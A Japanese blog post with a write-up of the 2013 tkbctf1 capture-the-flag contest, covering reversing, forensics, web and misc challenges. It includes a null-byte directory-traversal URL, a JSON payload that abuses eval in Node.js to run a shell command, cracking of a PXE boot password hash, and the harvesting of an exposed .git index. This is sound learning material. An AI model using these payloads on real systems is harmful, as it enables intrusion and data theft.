---
date: '2014-01-29T13:06:30+09:00'
title: tkbctf1 writeup
categories:
 - CTF
 - writeup
tags:
 - tkbctf
---

2013/5/4〜5/5の[tkbctf1](http://tkbctf.info/tkbctf1)に参加しました。

{{<image classes="fancybox" src="/assets/tkbctf1-writeup/fa296654d5c0a34f2c78631fe4577d70.png" title="Scoreboard">}}

{{<image classes="fancybox" src="/assets/tkbctf1-writeup/6007d2ae22af0d2db3a312c9ba731253.png" title="Challenges">}}

個人ランキングで1位でした。

<!--more-->

## 問題

### Who are you? (Bin 100)

リバースエンジニアリングの問題

\

    [BEGINNER]

    http://**/9a000ac8313f9179c4b057f56d27061430f4ed1e

\

$ file 9a000ac8313f9179c4b057f56d27061430f4ed1e

    9a000ac8313f9179c4b057f56d27061430f4ed1e: PE32 executable (console) Intel 80386, for MS Windows

\

入力した文字列と、デコードしたデータを比較するプログラム。

デバッガで動作を追うとすぐに答えが分かる。

{{<image classes="fancybox" src="/assets/tkbctf1-writeup/6f23314b8f198a132aad58b934088dfd.png" title="Screenshot">}}

\

Flagは「I'm a CTF player!!!」

\

途中までデバッガを使わずに解析していたため、問題と解くのに時間がかかってしまった。

### Happy Birthday (Misc 100)

    When did linux born? format: +%Y/%m/%d

\

Flagは Linux 0.01のリリース日の 1991/09/17

### slyr (Forensic 100)

クラッシュダンプを解析する問題

\

    [BEGINNER]

    What is he looking for?
    http://**/815B0B857EBF8AAED75E4232E0B60353C0B3C084

\

$ file 815B0B857EBF8AAED75E4232E0B60353C0B3C084 \

    815B0B857EBF8AAED75E4232E0B60353C0B3C084: Zip archive data, at least v2.0 to extract

\

$ file 815B0B857EBF8AAED75E4232E0B60353C0B3C084.expanded

    815B0B857EBF8AAED75E4232E0B60353C0B3C084.expanded: MDMP crash report data

\

$ strings 815B0B857EBF8AAED75E4232E0B60353C0B3C084.expanded

    ...
    u~Visited: Bob@http://www.google.com/search?hl=ja&source=hp&q=Windows+Vista+codename&gbv=2&oq=Windows+Vista+codename&gs_l=heirloom-hp.3..0i19j0i30i19j0i8i30i19l3.1282.4737.0.5448.26.19.2.5.5.0.120.1413.17j2.19.0...0.0...1ac.1.12.heirloom-hp.yt3DHbaT1k4...

\

クラッシュダンプの文字列を見ると、 問題のファイルは Internet
Explorerのクラッシュダンプで、 Windows
Vistaのコードネームについて調べていることが分かる。

Flagは、Windows Vistaのコードネームの「Longhorn」。

### blue (Web 100)

Null Byte Injectionとディレクトリトラバーサルの問題

\

    Find the flag.

    http://10.39.0.2/manual.php?page=sl

\

pageパラメータに渡された文字列から、「../」を取り除き、後に「.txt」をつけて、ファイルを読み込むプログラム。

NULL バイトから後が無視されるため、pageパラメータの最後にNULLをつけることで、 任意のファイルを読み込めてしまう。

http://10.39.0.2/manual.php?page=//home/blue/flag%00

Flagは「DIR\_TR@VERS@L」

### Diva (Bin 200)

ミク算

\

    [INTERMEDIATE]

    http://**/82C9DC2D2D3DF1635483D84B7A53FF0B8A80C37C


    正しいフラグは32文字です。 手違いで長すぎる物も通る状態で出してしまいました。もし32文字以下で正しい回答を得られた場合、**@**までフラグを連絡して下さい。 

    strlen(RIGHT_FLAG) = 32. If you got right answer with input less than 32 characters long, please send email to **@** with your flag.

\

    9 (57) : 87li  8*7+1   = 57

    3 (51) : u6s   57-6    = 51

    e (101): u2le  51*2-1  = 101

    n (110): u9a   101+9   = 110

    2 (50) : u2d5s 110/2-5 = 50

    a (97) : u2l3s 50*2-3  = 97

    h (104): u7a   97 + 7  = 104

\

    Press Enter key without any inputs to exit.
    > 87liu6su2leu9au2d5su2l3su7a
    ha2ne39
    A.Conguratulations! Send your input: 87liu6su2leu9au2d5su2l3su7a

\

問題作成者の解説:  [tkbctf1: Diva](https://web.archive.org/web/20140109071212/https://aquarite.info/2013/05/tkbctf1-diva/)

答えは「87liu6su2leu9au2d5su2l3su7a」

複数解が存在する

コードを読むのが辛くて、解いた後頭が痛くなった。

### My favorite Things (Forensic 400)

しゃけ！

解けた人が1人しかいなかったせいか、途中にヒントが追加されて、それに伴い350→300点と点数が下がっていった。

\

    This fragged disk image contains emotional message. Do you know my favorite? It's answer.

    http://**/56e6a4288ba1196b98824564fe4b98d3a5d17984


    Hint1: Tanks are dummy, some images are duplicated.

    Hint2: Shake!

\

解けなかった。

問題文のファイルは、 ディレクトリエントリ一部と、データ領域を含む FATファイルシステムの断片

\

    DE: name:FRAGGED    , attribute:8 reserved:0 createTimeMs:0:0:0 createTime:0:0:0 createDate:1980/0/0, accessDate:1980/0/0 cluster:0, updateTime5:33:104 updateDate:2013/5/3 fileSize:0
    LFN: deleted:0, continues:64, seq:1, name:imoviewer.apk attribute: 15, reserved:0, checkCode:192, cluster:0
    DE: name:IMOVIE~1APK, attribute:32 reserved:0 createTimeMs:0:2:44 createTime:5:36:28 createDate:2013/5/3, accessDate:2013/5/3 cluster:69250, updateTime5:35:48 updateDate:2013/5/3 fileSize:6161171
    DE: name:GREEN   BMP, attribute:32 reserved:24 createTimeMs:0:1:68 createTime:5:40:48 createDate:2013/5/3, accessDate:2013/5/3 cluster:3, updateTime5:40:112 updateDate:2013/5/3 fileSize:5760054
    DE: name:GRAY    GIF, attribute:32 reserved:24 createTimeMs:0:1:124 createTime:5:45:24 createDate:2013/5/3, accessDate:2013/5/3 cluster:11254, updateTime5:44:68 updateDate:2013/5/3 fileSize:144927
    DE: name:RED     BMP, attribute:32 reserved:24 createTimeMs:0:0:116 createTime:5:45:32 createDate:2013/5/3, accessDate:2013/5/3 cluster:75106, updateTime5:41:0 updateDate:2013/5/3 fileSize:5760054
    DE: name:BLUE    BMP, attribute:32 reserved:24 createTimeMs:0:0:24 createTime:5:45:40 createDate:2013/5/3, accessDate:2013/5/3 cluster:44245, updateTime5:41:24 updateDate:2013/5/3 fileSize:5760054
    DE: name:TYPE90  JPG, attribute:32 reserved:24 createTimeMs:0:2:84 createTime:5:49:48 createDate:2013/5/3, accessDate:2013/5/3 cluster:55496, updateTime5:47:92 updateDate:2013/5/3 fileSize:1664984
    DE: name:TYPE97  JPG, attribute:32 reserved:24 createTimeMs:0:2:88 createTime:5:49:48 createDate:2013/5/3, accessDate:2013/5/3 cluster:60149, updateTime5:48:80 updateDate:2013/5/3 fileSize:1033239
    LFN: deleted:0, continues:64, seq:2, name:jpg attribute: 15, reserved:0, checkCode:189, cluster:0
    LFN: deleted:0, continues:0, seq:1, name:type90 - コピー. attribute: 15, reserved:0, checkCode:189, cluster:0
    DE: name:TYPE90~1JPG, attribute:32 reserved:0 createTimeMs:0:0:104 createTime:5:49:60 createDate:2013/5/3, accessDate:2013/5/3 cluster:62168, updateTime5:47:92 updateDate:2013/5/3 fileSize:1664984
    LFN: deleted:0, continues:64, seq:2, name:jpg attribute: 15, reserved:0, checkCode:37, cluster:0
    LFN: deleted:0, continues:0, seq:1, name:type97 - コピー. attribute: 15, reserved:0, checkCode:37, cluster:0
    DE: name:TYPE97~1JPG, attribute:32 reserved:0 createTimeMs:0:0:108 createTime:5:49:60 createDate:2013/5/3, accessDate:2013/5/3 cluster:11538, updateTime5:48:80 updateDate:2013/5/3 fileSize:1033239
    LFN: deleted:0, continues:64, seq:2, name:(2).jpg attribute: 15, reserved:0, checkCode:29, cluster:0

\

ディスクイメージからapkを取り出すことが出来なかった。

### Good Old Days (Bin 300)

リバースエンジニアリングの問題

\

    [ADVANCED]

    I need the "Message" to continue my game but I forgot the secret command!!!

    Can you get the "Message"? I remember that the "Message" was alphanumeric characters.

    http://**/cb0c3d0f55b9b627b831f4fbbc153846

\

$ file cb0c3d0f55b9b627b831f4fbbc153846\

    cb0c3d0f55b9b627b831f4fbbc153846: iNES ROM dump, 2x16k PRG, 1x8k CHR, [Vert.], [SRAM]

\

問題文のファイルはファミコンのROM。

←↓↑→ABのどれかのキーを8回入力すると、8文字のメッセージが表示される。

{{<image classes="fancybox" src="/assets/tkbctf1-writeup/df5efc6331016d8e552c2fa6d1d7332d.png" title="Screenshot">}}

\

メモリビューワを使うと キーを押すと アドレス
0x6000-0x6007が順に変化していくがわかる。

そこで、そこに書き込みブレークポイントを仕掛ける。

キーを押して動作を調べていくと、

A: 0x36でXOR \
B: 0x5cでXOR \
↑: 0xc9でXOR \
↓: 0xa3でXOR \
→: 右ローテート \
←: 左ローテート

であることががわかる。

\

    #!/usr/bin/python
    operators = (
        ("A",     lambda x: x ^ 0x36),
        ("B",     lambda x: x ^ 0x5c),
        ("UP",    lambda x: x ^ 0xc9),
        ("DOWN",  lambda x: x ^ 0xa3),
        ("RIGHT", lambda x: (x >> 1) | ((x & 1) << 7)), #rotate right
        ("LEFT",  lambda x: ((x << 1) & 0xff) | ((x & 0x80) >> 7)), #rotate left
    )
    values = (0xBE, 0x60, 0xA4, 0xA5, 0x88, 0x64, 0x03, 0x6A)
    for x in values:
        out = []
        for op, action in operators:
            y = action(x)
            if chr(y).isalnum():
                out.append(chr(y))
        print out

\

    $ python solve.py
    ['w']
    ['V', '0']
    ['m', 'R', 'I']
    ['l', 'K']
    ['A', 'D']
    ['R', '8', '2']
    ['5']
    ['6', '5']

\

出力が英数字になるパターンが何個かあるが、

意味のある文字列の「w0RlD256」が答え。

### Are these your grades? (Web 400)

SQLインジェクションの問題

\

    こんにちは。博麗大学のS.Iと申します。

    春休みに入り成績が付いたのですが、どうも線形代数Iの成績が芳しくないのです。これを落とすとたいへんなことになってしまいます。

    線形代数にF(落第点)が付いているのですが、これをD(及第点ギリギリ)に書き換えてくださいませんか?

    わたしのログイン情報は 13413983:f.scarlet495 なので、ご参考まで。

    どうかお力添えをお願いします。


    Greetings. I'm S.I at University of Hakurei.

    I'm very anxious about my grades, especially Linear Algebra I.

    It's about time for professors to grade us on their Online Grading System, however, I've failed the Linear Algebra I class which is a big trouble.

    Can you hack into it and grade me "D" for Linear Algebra I instead of an "F"?

    Here's my login information: 13413983:f.scarlet495

    I appreciate your help.


    --- このCTFミッションは、WIDEプロジェクト (http://www.wide.ad.jp) 提供のネットワークにて公開しております。所在地: 筑波大学3F棟230号室 産学間連携推進室 ---

    --- This CTF Mission is provided via Tsukuba WIDE (http://www.wide.ad.jp), at 3F230, University of Tsukuba. ---

    http://**/

邪道な方法で解いた。

/.git ディレクトリに外部からアクセスできる状態になっていたので、/.git/indexをダウンロードしてファイルの一覧を得る。

$ strings index

    DIRC
    6b}Z
    etc/config.yml
    index.pl
    lib/CTF/Grades.pm
    lib/CTF/Login.pm
    lib/CTF/Template.pm
    uQ{qx
    lib/scripts/grades.pl
    lib/scripts/login.pl
    xh`A
    lib/scripts/menu.pl
    lib/scripts/subjects.pl
    templates/LICENSE.txt
    templates/footer.tt
    templates/gpl.txt
    templates/grades.tt
    templates/grades_editable.tt
    P9&U
    templates/header.tt
    templates/main.tt
    #MhE
    templates/not_logged_in.tt
    templates/style.css
    templates/subjects.tt
    TREE
    19 3
    i>fAt\etc
    +XfG@
    [$]lib
    scripts
    U: E)>
    templates
    10 0

/etc/config.ymlにFLAGが書いてある。

FLAG: 忘れた

問題作成者の解説: [第1回tkbctf 問題「Are these your grades?」を作ってみた](https://web.archive.org/web/20170920022611/https://x86-64.jp/blog/tkbctf1-are-these-your-grades)\

### fairy (Misc 200)

    We need to access a thin client to get trade secret of rival company.

    However the client needs to be unlocked at boot sequence. Can you unlock?

    This file may help you.

    http://**/250d3a31dee7f62d57ea3d17f544b5e4750e8039

\

    $ file 250d3a31dee7f62d57ea3d17f544b5e4750e8039 

    250d3a31dee7f62d57ea3d17f544b5e4750e8039: tcpdump capture file (little-endian) - version 2.4 (Ethernet, capture length 65535)

{{<image classes="fancybox" src="/assets/tkbctf1-writeup/ae5200b836564e01fc6b87f382440418.png" title="TFTP packets">}}

問題文のファイルは、PXEブートのパケットキャプチャです。

そこからアンロックに必要な情報を抜き取る。

strings でキャプチャファイルを覗くと パスワードのハッシュが得られる。

    default menu.c32
    label debian
            menu passwd $4$OVtcFw7z$9S2RpE0jMdbV1Z/+daXh2RGQtDM$
            kernel linux
            append initrd=initrd.gz

\
このパスワードハッシュは sha1pass
スクリプトで生成されたもので、以下のような形式になっています。

    '$4$' + salt + '$' + BASE64(SHA1(salt + password)) + '$'

John the
Ripperはこの形式のハッシュに対応していないので、Johnがサポートしている
sha1-gen形式に変換する。

\

$ echo "9S2RpE0jMdbV1Z/+daXh2RGQtDM" | base64 -d | xxd -p

    f52d91a44d2331d6d5d59ffe75a5e1d91190b433

\

$ echo "$SHA1p$OVtcFw7z$f52d91a44d2331d6d5d59ffe75a5e1d91190b433" \> boot-passwd

$ john --show  --format=sha1-gen boot-passwd 

    ?:goodluck
    1 password hash cracked, 0 left

\

Flagは「goodluck」

### What is this? (Web 200)

    This runs in user 'commando'. http://10.39.0.5/servinfo.html

servinfo.htmlでは、一定時間ごとに /info へJSONをpostして

-   時刻
-   実行中のプロセスの数
-   Load Average

の3つの情報を取得して表示している。

    {"info": "time"}

evalで入力をパースしているため、以下のように細工したJSONを送信することで、任意のコードを実行できてしまう。

    {"info": function() {
      var orig = Date.prototype.getTime;
      Date.prototype.getTime = function() {
        var util = require('util');
        var exec = require('child_process').exec;
        function a(error, stdout, stderr) {
          GLOBAL.__stdout = stdout;
          GLOBAL.__stderr = stderr;
        }
        exec("cat /home/commado/flag", a);
        return [GLOBAL.__stdout, GLOBAL.__stderr];
      };
      process.nextTick(function() { Date.prototype.getTime = orig; });
      return "time";
    }()}

Flagは「MACHOMAN」

最初はflagのパーミッションが間違っていて、rootしか読めないようになってしまっていたが
修正された。

### Who wrote this? (Misc 300)

    http://**/581cf9b214c109556fbb3cf74094dcded66baa17

解けなかった。

$ file 581cf9b214c109556fbb3cf74094dcded66baa17

    581cf9b214c109556fbb3cf74094dcded66baa17: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.9, not stripped

問題文のファイルを展開すると、ELFファイルが出てくる。

    08048374 <main>:
     8048374:       3c 03                   cmp    $0x3,%al
     8048376:       3c 08                   cmp    $0x8,%al
     8048378:       3c 05                   cmp    $0x5,%al
     804837a:       b7 08                   mov    $0x8,%bh
     804837c:       3c 07                   cmp    $0x7,%al
     804837e:       04 09                   add    $0x9,%al
     8048380:       04 09                   add    $0x9,%al
     8048382:       b7 08                   mov    $0x8,%bh
     8048384:       2c 0a                   sub    $0xa,%al
     8048386:       b0 08                   mov    $0x8,%al
     8048388:       2c 0b                   sub    $0xb,%al
     804838a:       3c 08                   cmp    $0x8,%al
     804838c:       b7 0b                   mov    $0xb,%bh
     804838e:       04 08                   add    $0x8,%al
     8048390:       2c 0c                   sub    $0xc,%al
     8048392:       3c 07                   cmp    $0x7,%al
     8048394:       1c 0c                   sbb    $0xc,%al

実行してもなにも起こらないコード

バイナリエディタで見てもよく分からなかった。
